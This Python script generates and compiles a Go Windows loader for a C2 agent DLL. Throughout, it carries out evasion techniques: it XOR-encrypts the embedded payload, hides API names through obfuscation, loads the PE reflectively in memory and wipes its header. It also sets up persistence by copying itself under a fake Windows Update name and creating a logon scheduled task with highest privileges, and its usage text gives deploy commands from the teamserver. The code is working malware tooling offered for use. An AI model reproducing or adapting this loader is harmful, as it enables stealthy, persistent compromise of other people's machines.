#!/usr/bin/env python3
"""
Generate loader.exe — native Go Windows agent loader (no .NET, no MSIL).
Rolling 16-byte XOR encryption, dynamic API resolution, WinExe (no console).
Output: bypass/loader.exe

Usage:
  python3 bypass/gen_go.py
  Deploy:
    upload /home/kali/turon-c2-src/bypass/loader.exe C:/Windows/Temp/loader.exe
    shell C:/Windows/Temp/loader.exe
"""
import base64, os, subprocess, sys, shutil, tempfile, secrets

ROOT = os.path.dirname(os.path.abspath(__file__))
DLL  = os.path.join(ROOT, '..', 'demon.x64.dll')
OUT  = os.path.join(ROOT, 'loader.exe')

if not os.path.exists(DLL):
    print(f"[!] DLL not found: {DLL}")
    sys.exit(1)

print(f"[*] Reading {DLL} ...")
dll = open(DLL, 'rb').read()

# Random 16-byte rolling XOR key (different every build)
key = secrets.token_bytes(16)
enc = bytes([dll[i] ^ key[i % 16] for i in range(len(dll))])
b64 = base64.b64encode(enc).decode()
print(f"[*] DLL: {len(dll):,} bytes  key: {key.hex()}  b64: {len(b64):,} chars")

# Split b64 into chunks
CHUNK = 30000
chunks = [b64[i:i+CHUNK] for i in range(0, len(b64), CHUNK)]

# Helper: C# byte array literal for a string XOR'd with 0x5E
SK = 0x5E
def xb(s):
    return '{' + ','.join(str(ord(c) ^ SK) for c in s) + '}'

# Payload key as Go byte slice literal
key_lit = '{' + ','.join(str(b) for b in key) + '}'

# b64 chunks as Go string literals
chunks_lit = ',\n\t\t'.join(f'`{c}`' for c in chunks)

# ── Go source ──────────────────────────────────────────────────────────────────
go_src = f'''//go:build windows

package main

import (
\t"encoding/base64"
\t"os"
\t"os/exec"
\t"path/filepath"
\t"runtime"
\t"strings"
\t"sync"
\t"syscall"
\t"unsafe"
)

// decode XOR-obfuscated API name
func ds(b []byte) string {{
\tc := make([]byte, len(b)); for i, x := range b {{ c[i] = x ^ 0x{SK:02X} }}; return string(c)
}}

var (
\tapiOnce      sync.Once
\tpVA, pVP     *syscall.Proc
\tpFIC, pGCP   *syscall.Proc
\tpCM          *syscall.Proc
)

func initAPIs() {{
\tapiOnce.Do(func() {{
\t\tk32, _ := syscall.LoadDLL(ds([]byte{xb("kernel32.dll")}))
\t\tpVA,  _ = k32.FindProc(ds([]byte{xb("VirtualAlloc")}))
\t\tpVP,  _ = k32.FindProc(ds([]byte{xb("VirtualProtect")}))
\t\tpFIC, _ = k32.FindProc(ds([]byte{xb("FlushInstructionCache")}))
\t\tpGCP, _ = k32.FindProc(ds([]byte{xb("GetCurrentProcess")}))
\t\tpCM,  _ = k32.FindProc(ds([]byte{xb("CreateMutexW")}))
\t}})
}}

func sectProt(c uint32) uintptr {{
\te := c&0x20000000 != 0; r := c&0x40000000 != 0; w := c&0x80000000 != 0
\tif e && w {{ return 0x40 }}; if e && r {{ return 0x20 }}; if e {{ return 0x10 }}
\tif w {{ return 0x04 }}; return 0x02
}}

func ru16(m uintptr, o int) uint16 {{ return *(*uint16)(unsafe.Pointer(m + uintptr(o))) }}
func ru32(m uintptr, o int) uint32 {{ return *(*uint32)(unsafe.Pointer(m + uintptr(o))) }}
func ri32(m uintptr, o int) int    {{ return int(int32(ru32(m, o))) }}
func ri64(m uintptr, o int) int64  {{ return *(*int64)(unsafe.Pointer(m + uintptr(o))) }}
func wu64(m uintptr, o int, v int64) {{ *(*int64)(unsafe.Pointer(m + uintptr(o))) = v }}

// Read from raw byte slice (for section/PE headers — before mapping)
func pu32(b []byte, o int) uint32 {{ return uint32(b[o]) | uint32(b[o+1])<<8 | uint32(b[o+2])<<16 | uint32(b[o+3])<<24 }}
func pu16(b []byte, o int) uint16 {{ return uint16(b[o]) | uint16(b[o+1])<<8 }}
func pi32(b []byte, o int) int    {{ return int(int32(pu32(b, o))) }}
func pi64(b []byte, o int) int64  {{
\tv := uint64(b[o]) | uint64(b[o+1])<<8 | uint64(b[o+2])<<16 | uint64(b[o+3])<<24
\tv |= uint64(b[o+4])<<32 | uint64(b[o+5])<<40 | uint64(b[o+6])<<48 | uint64(b[o+7])<<56
\treturn int64(v)
}}

func memCopy(dst uintptr, src []byte, off, n int) {{
\td := unsafe.Slice((*byte)(unsafe.Pointer(dst)), n)
\tcopy(d, src[off:off+n])
}}

func loadPE(pe []byte) {{
\truntime.LockOSThread()
\teo  := pi32(pe, 0x3C)
\tns  := int(pu16(pe, eo+6))
\tsoh := int(pu16(pe, eo+20))
\tep  := pi32(pe, eo+24+16)
\tib  := pi64(pe, eo+24+24)
\tsi  := pi32(pe, eo+24+56)
\tsh  := pi32(pe, eo+24+60)
\trRva:= pi32(pe, eo+24+152)
\trSz := pi32(pe, eo+24+156)
\tsto := eo + 24 + soh

\t// Allocate: RW first, then fix perms
\tbase, _, _ := pVA.Call(0, uintptr(si), 0x3000, 0x04)
\tif base == 0 {{ return }}

\t// Copy headers + sections
\tmemCopy(base, pe, 0, sh)
\tfor i := 0; i < ns; i++ {{
\t\tso := sto + i*40
\t\tva := pi32(pe, so+12); ro := pi32(pe, so+20); rl := pi32(pe, so+16)
\t\tif rl > 0 {{ memCopy(base+uintptr(va), pe, ro, rl) }}
\t}}

\t// Apply base relocations (read from mapped memory)
\tif rRva != 0 {{
\t\tdelta := int64(base) - ib; off := 0
\t\tfor off < rSz {{
\t\t\trv  := ri32(base, rRva+off)
\t\t\tbsz := ri32(base, rRva+off+4)
\t\t\tif bsz < 8 {{ break }}
\t\t\tne  := (bsz - 8) / 2
\t\t\tfor j := 0; j < ne; j++ {{
\t\t\t\ten := ru16(base, rRva+off+8+j*2)
\t\t\t\tif en>>12 == 10 {{
\t\t\t\t\tpa := int(base) + rv + int(en&0xFFF)
\t\t\t\t\twu64(uintptr(pa), 0, ri64(uintptr(pa), 0)+delta)
\t\t\t\t}}
\t\t\t}}
\t\t\toff += bsz
\t\t}}
\t}}

\t// Set section permissions
\tvar old uint32
\tfor i := 0; i < ns; i++ {{
\t\tso := sto + i*40
\t\tva := uintptr(pu32(pe, so+12))
\t\tvs := pi32(pe, so+8); if vs == 0 {{ vs = pi32(pe, so+16) }}
\t\tch := pu32(pe, so+36)
\t\tif vs > 0 {{
\t\t\tpVP.Call(base+va, uintptr(vs), sectProt(ch), uintptr(unsafe.Pointer(&old)))
\t\t}}
\t}}

\t// Flush instruction cache
\tproc, _, _ := pGCP.Call()
\tpFIC.Call(proc, base, uintptr(si))

\t// Call DllMain(base, DLL_PROCESS_ATTACH=1, NULL)
\tsyscall.SyscallN(base+uintptr(ep), base, 1, 0)

\t// Erase PE header
\thdr := unsafe.Slice((*byte)(unsafe.Pointer(base)), sh)
\tfor i := range hdr {{ hdr[i] = 0 }}
}}

func install() {{
\texe, err := os.Executable(); if err != nil {{ return }}
\tdst := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "WUHealth", "WUHealthCheck.exe")
\tif !strings.EqualFold(exe, dst) {{
\t\tos.MkdirAll(filepath.Dir(dst), 0755)
\t\tif _, e := os.Stat(dst); os.IsNotExist(e) {{
\t\t\tif data, e2 := os.ReadFile(exe); e2 == nil {{ os.WriteFile(dst, data, 0644) }}
\t\t}}
\t}}
\texec.Command("schtasks.exe",
\t\t"/Create", "/F",
\t\t"/TN", "MicrosoftUpdateSync",
\t\t"/TR", dst,
\t\t"/SC", "ONLOGON",
\t\t"/RL", "HIGHEST",
\t).Run()
}}

func main() {{
\tinitAPIs()
\t// Single-instance mutex
\tmn, _ := syscall.UTF16PtrFromString("WUH9C2B4F1")
\tpCM.Call(0, 1, uintptr(unsafe.Pointer(mn)))
\tif syscall.GetLastError() == syscall.Errno(183) {{ return }} // ERROR_ALREADY_EXISTS

\tinstall()

\t// Decrypt and load agent
\tparts := []string{{
\t\t{chunks_lit},
\t}}
\traw, _ := base64.StdEncoding.DecodeString(strings.Join(parts, ""))
\tkey    := []byte{key_lit}
\tfor i, b := range raw {{ raw[i] = b ^ key[i%len(key)] }}
\tgo loadPE(raw)

\tselect {{}} // keep alive forever
}}
'''

# ── Build ──────────────────────────────────────────────────────────────────────
tmp = tempfile.mkdtemp(prefix='go_loader_')
try:
    src_path = os.path.join(tmp, 'main.go')
    out_path = os.path.join(tmp, 'loader.exe')
    open(src_path, 'w').write(go_src)

    print(f"[*] Building native Windows EXE (Go) ...")
    env = os.environ.copy()
    env['GOOS']   = 'windows'
    env['GOARCH'] = 'amd64'
    env['CGO_ENABLED'] = '0'

    r = subprocess.run(
        ['go', 'build',
         '-ldflags', '-s -w -H windowsgui',
         '-o', out_path,
         src_path],
        capture_output=True, text=True, env=env
    )
    if r.returncode != 0:
        print("[!] Build failed:")
        print(r.stdout)
        print(r.stderr)
        # save source for debugging
        dbg = os.path.join(ROOT, 'loader_debug.go')
        shutil.copy(src_path, dbg)
        print(f"[*] Source saved to {dbg}")
        sys.exit(1)

    shutil.copy(out_path, OUT)
    size = os.path.getsize(OUT)
    print(f"[+] {OUT}  ({size:,} bytes)")
    print()
    print("Deploy (from teamserver agent console):")
    print(f"  upload {OUT} C:\\Windows\\Temp\\loader.exe")
    print(f"  shell C:\\Windows\\Temp\\loader.exe")

finally:
    shutil.rmtree(tmp, ignore_errors=True)
